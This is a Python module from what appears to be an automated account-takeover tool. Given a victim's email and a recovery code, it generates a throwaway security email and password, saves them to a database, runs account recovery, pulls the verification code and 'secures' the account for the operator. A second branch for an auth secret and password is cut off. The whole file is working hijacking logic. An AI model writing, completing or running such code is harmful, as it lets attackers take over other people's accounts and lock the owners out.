from views.utils.securing.generateEmail import generateEmail
from views.utils.securing.getEmailCode import getEmailCode
from views.utils.securing.getLiveData import getLiveData
from views.utils.startSecure import startSecuringAccount
from views.utils.securing.recovery import recover
from views.utils.sendAuth import sendAuth

from views.utils.initialSession import getSession

from database.database import DBConnection
import uuid

async def recoverySecure(email: str, type: str, data: dict) -> dict:

    session = getSession()

    sname = uuid.uuid4().hex[:16]
    password = uuid.uuid4().hex[:12]

    type, security_email = await generateEmail(sname, password)
    print(f"[+] - Generated Security Email ({security_email})")

    with DBConnection() as database:
        database.addSecurityEmail(security_email, password)

    print("[~] - Automaticly Securing Account...")
    match type:
        case "rcode":
            recovery_code = data["recovery_code"]
        
            data = await recover(session, email, recovery_code, security_email, password, type)
            print(data)
            if not data:
                return data

            await getLiveData(session)
            await sendAuth(session, email)

            code = await getEmailCode(type)

            account = await startSecuringAccount(
                session = session,
                email = email,
                code = code,
                recovery = False
            )

            print(account)
        case "authpwd":
            secret = data["auth_secret"]
            password = data["password"]

            